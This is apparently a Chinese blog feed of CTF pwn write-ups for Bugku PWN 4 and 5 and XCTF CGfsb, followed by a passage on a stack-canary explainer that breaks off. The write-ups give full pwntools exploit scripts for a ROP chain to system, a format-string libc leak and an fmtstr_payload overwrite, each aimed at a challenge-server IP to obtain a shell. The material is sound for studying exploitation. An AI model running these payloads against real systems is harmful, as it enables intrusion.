disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>直接拿IDA Pro打开反汇编一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Come on,try to pwn me"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So~sad,you are fail"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在很明显的栈溢出漏洞</p><p>函数虽然调用了<strong>system</strong>，但参数不是<strong>“/bin/sh”</strong>，无法获得<strong>shell</strong>。所以需要我们自己构造<strong>shell</strong>将<strong>“/bin/sh”</strong>作为参数传给<strong>system</strong>函数，然后调用。在<strong>ida</strong>的数据段搜索<strong>“/bin/sh”</strong>,找不到，但是可以找到<strong>“$0”</strong>,也可以得到<strong>shell</strong></p><blockquote><p><strong>$0</strong>在<strong>linux</strong>中为为<strong>shell</strong>或<strong>shell</strong>脚本的名称。<strong>system()</strong>会调用<strong>fork()</strong>产生子进程，由子进程来调用<strong>/bin/sh -c string</strong>来执行参数<strong>string</strong>字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<strong>$0</strong>作为<strong>system</strong>的参数，能达到传入<strong>‘/bin/sh’</strong>一样的效果。</p></blockquote><p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<strong>rdi</strong>、<strong>rsi</strong>、<strong>rdx</strong>、<strong>rcx</strong>、<strong>r8</strong>、<strong>r9</strong>来传递参数（参数个数小于7的时候）。</p><p>我们利用<strong>ROPgadget</strong>工具进行查找，得到<strong>pop rdi ; ret</strong> 和<strong>$0</strong>的地址,<strong>system</strong>的地址直接在<strong>IDA</strong>中查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn4$ ROPgadget --binary pwn4 --only 'pop|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d2 : pop r15 ; ret</span><br><span class="line">0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007d3 : pop rdi ; ret</span><br><span class="line">0x00000000004007d1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure><p>然后直接开写exp吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn4')</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007d3</span> </span><br><span class="line">bin_sh = <span class="number">0x000000000060111f</span></span><br><span class="line">system = <span class="number">0x000000000040075A</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line">p.recvuntil(<span class="string">'Come on,try to pwn me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">stack2</span><br><span class="line"><span class="meta">$</span> cat flag</span><br><span class="line">flag&#123;264bc50112318cd6e1a67b0724d6d3af&#125;$</span><br></pre></td></tr></table></figure><h2 id="PWN-5"><a href="#PWN-5" class="headerlink" title="PWN 5"></a>PWN 5</h2><p>先检查一下文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn5/human'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>直接拿IDA Pro打开反汇编一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_400978);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400998);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;s, &amp;needle) || !<span class="built_in">strstr</span>(&amp;s, &amp;byte_4009BA) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4009C8);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4009F8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先发现第一次输入存在<strong>printf</strong>函数，存在格式化字符串漏洞，泄露出栈上的<strong>libc_start_main</strong>。<strong>libc_start_main</strong>是<strong>libc</strong>中的函数，可以泄露出加载<strong>libc</strong>的基地址。然后就是找服务器<strong>system</strong>地址和<strong>binsh</strong>地址，通过<strong>gadget</strong>赋值。关键是如何通过字符串泄露出<strong>libc_start_main</strong>的地址，我们通过动态调试来看</p><p>首先在printf函数下一个断点，然后运行到此处，查看栈上的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp  <span class="number">0x7fffffffde60</span> ◂— <span class="number">0xa61</span> <span class="comment">/* 'a\n' */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│              <span class="number">0x7fffffffde68</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp          <span class="number">0x7fffffffde80</span> —▸ <span class="number">0x4008d0</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│              <span class="number">0x7fffffffde88</span> —▸ <span class="number">0x7ffff7a2d830</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32w $rsp</span><br><span class="line">0x7fffffffde60:0x243131250x00000a700x000000000x00000000</span><br><span class="line">0x7fffffffde70:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x7fffffffde80:0x004008d00x000000000xf7a2d8300x00007fff</span><br><span class="line">0x7fffffffde90:0xffffdf680x00007fff0xffffdf680x00007fff</span><br><span class="line">0x7fffffffdea0:0xf7b996080x000000010x004007960x00000000</span><br><span class="line">0x7fffffffdeb0:0x000000000x000000000x603a5ce00xa87e90b7</span><br><span class="line">0x7fffffffdec0:0x004006a00x000000000xffffdf600x00007fff</span><br><span class="line">0x7fffffffded0:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><p>可以看到在栈上第11个位置存在<strong>libc_start_main+240</strong>,即<strong>libc_start_main_ret</strong>的地址，把<strong>libc</strong>文件放在<strong>ida</strong>中，找到<strong>_libc_start_main</strong>函数中调用<strong>main</strong>函数的地方，查看地址。这个<strong>main</strong>的返回地址就=<strong>libc</strong>基址+<strong>0x2082E</strong>(这个<strong>call rax</strong>的偏移地址) + <strong>2</strong>(<strong>call rax</strong>的长度为2)，<strong>libc</strong>的<strong>system</strong>函数偏移地址<strong>0x45390</strong>，<strong>“/bin/sh”</strong>字符串偏移地址<strong>0x18cd57</strong>，<strong>human</strong>的<strong>pop_rdi_ret</strong>地址<strong>0x400933</strong>，<strong>libc</strong>中函数的实际地址=<strong>libc</strong>基址 + 函数偏移地址</p><p>然后变量<strong>s</strong>存在溢出，且要避免执行<strong>exit()</strong>;查看<strong>if</strong>中比较的两个字符串，一个是“<strong>真香</strong>”，一个是“<strong>鸽子</strong>”，也就是说输入字符串<strong>s</strong>中要同时存在这两个词。</p><p>故可写Exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"114.116.54.89"</span>, <span class="string">"10005"</span>)</span><br><span class="line"><span class="comment">#p = process("./human")</span></span><br><span class="line">pop_rdi = <span class="number">0x400933</span></span><br><span class="line">bin_add = <span class="number">0x18cd57</span></span><br><span class="line">sys_add = <span class="number">0x45390</span></span><br><span class="line">gezi = <span class="string">"鸽子"</span></span><br><span class="line">zhenxiang = <span class="string">"真香"</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"?\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%11$p."</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line">libc_leak = int(p.recvline()[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x20830</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"还有什么本质?"</span>)</span><br><span class="line">bin_abs = libc_base + bin_add</span><br><span class="line">sys_abs = libc_base + sys_add</span><br><span class="line">payload = (gezi+zhenxiang).ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">"A"</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_abs)</span><br><span class="line">payload += p64(sys_abs)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fmtstr模块的使用</title>
      <link href="/2019/09/24/fmtstr%E2%94%80%C3%BA%E2%94%90%CE%98%E2%95%A1%E2%94%80%E2%95%A9%E2%95%A3%E2%95%99%E2%94%9C/"/>
      <url>/2019/09/24/fmtstr%E2%94%80%C3%BA%E2%94%90%CE%98%E2%95%A1%E2%94%80%E2%95%A9%E2%95%A3%E2%95%99%E2%94%9C/</url>
      
        <content type="html"><![CDATA[<p>总所周知，在CTF题目中，有一种很基础但又很令人烦的题型就是格式化字符串，因为我觉得其中的内存构造其实计算得是比较复杂的，但是有了<strong>pwntools</strong>内置的<strong>fmtstr</strong>模块对于很多简单的<strong>Format String Vulnerability</strong>就秒了</p><h2 id="cgfsb"><a href="#cgfsb" class="headerlink" title="cgfsb"></a>cgfsb</h2><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/2.png" alt="img"></p><p>不难看出这题的解法就是让<strong>pwnme</strong>的值为8就好了，按照传统的做法我们需要测量写入位置的参数然后构造复杂的字符串序列，使用<strong>pwntools</strong>的模块可以大幅简化构造流程，但是我们还是需要测量写入位置</p><p>通过 <strong>ida</strong> 查看汇编代码 找到<code>call printf</code>的地址（调用<strong>printf(&amp;s)</strong>）。之后我们用<strong>gdb</strong>进行调试，在调用<strong>printf(&amp;s)</strong>之前下一个断点,查看接收 <strong>message</strong> 的变量 <strong>s</strong> 是格式化字符串的第几个参数。输入 <strong>message</strong> 的时候输入 <strong>‘aaaa’</strong></p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/3.png" alt="img"></p><p>查看当前栈中的内容</p><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/4.png" alt="img"></p><p>传统的Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">DEBUG = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">p = process(<span class="string">'./cgfsb'</span>) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30147</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">"ABCD"</span> </span><br><span class="line">payload2 = p32(pwnme_addr) + <span class="string">'aaaa%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>) </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recv() </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><p>使用pwntools fmtstr模块的Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">41020</span>)</span><br><span class="line"><span class="comment">#p = process('./fmt')</span></span><br><span class="line">payload1 = <span class="string">"ABCD"</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>) </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804A068</span>:<span class="number">0x8</span>&#125;)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>其中<strong>10</strong>即为参数位置，<strong>0x0804A068</strong>即为需要修改的地址，<strong>0x8</strong>即为需要的值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从BabyCanary入门Canary</title>
      <link href="/2019/09/18/%E2%94%A4%E2%95%99BabyCanary%E2%95%9A%CE%B4%E2%94%9C%E2%94%BCCanary/"/>
      <url>/2019/09/18/%E2%94%A4%E2%95%99BabyCanary%E2%95%9A%CE%B4%E2%94%9C%E2%94%BCCanary/</url>
      
        <content type="html"><![CDATA[<p><strong>Canary</strong>直译就是金丝雀，为什么是叫金丝雀</p><p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离</p><p>由于 <strong>stack overflow</strong> 而引发的攻击非常普遍也非常古老, 相应地一种叫做 <strong>canary</strong> 的 <strong>mitigation</strong> 技术很早就出现在 <strong>glibc</strong> 里, 直到现在也作为系统安全的第一道防线存在。</p><p><strong>Canary</strong> 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 <strong>stack overflow</strong> 发生的 高危区域的尾部, 当函数返回之时检测 <strong>canary</strong> 的值是否经过了改变, 以此来判断 <strong>stack/buffer overflow</strong> 是否发生.</p><p><strong>Canary</strong> 与 <strong>windows</strong> 下的 <strong>GS</strong> 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 <strong>linux</strong> 下保护机制的标配</p><h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 <strong>GCC</strong> 中使用以下参数设置 <strong>Canary</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure><h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 <strong>Canary</strong> 保护的 <strong>stack</strong> 结构大概如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 <strong>Canary</strong> 编译后，在函数序言部分会取 <strong>fs</strong> 寄存器 <strong>0x28</strong> 处的值，存放在栈中 <strong>%ebp-0x8</strong> 的位置。 这个操作即为向栈中插入 <strong>Canary</strong> 值，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 <strong>fs:0x28</strong> 的值进行异或。如果异或的结果为 <strong>0</strong>，说明 <strong>canary</strong> 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 <strong>canary</strong> 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 <strong>glibc</strong> 中的函数，默认情况下经过 <strong>ELF</strong> 的延迟绑定，定义如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 <strong>go</strong>t 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容</p><p>进一步，对于 <strong>Linux</strong> 来说，<strong>fs</strong> 寄存器实际指向的是当前栈的 <strong>TLS</strong> 结构，<strong>fs:0x28</strong> 指向的正是 <strong>stack_guard</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 <strong>TLS</strong> 中保存的 <strong>Canary</strong> 值那么就可以实现绕过保护机制。</p><p>事实上，<strong>TLS</strong> 中的值由函数 <strong>security_init</strong> 进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, 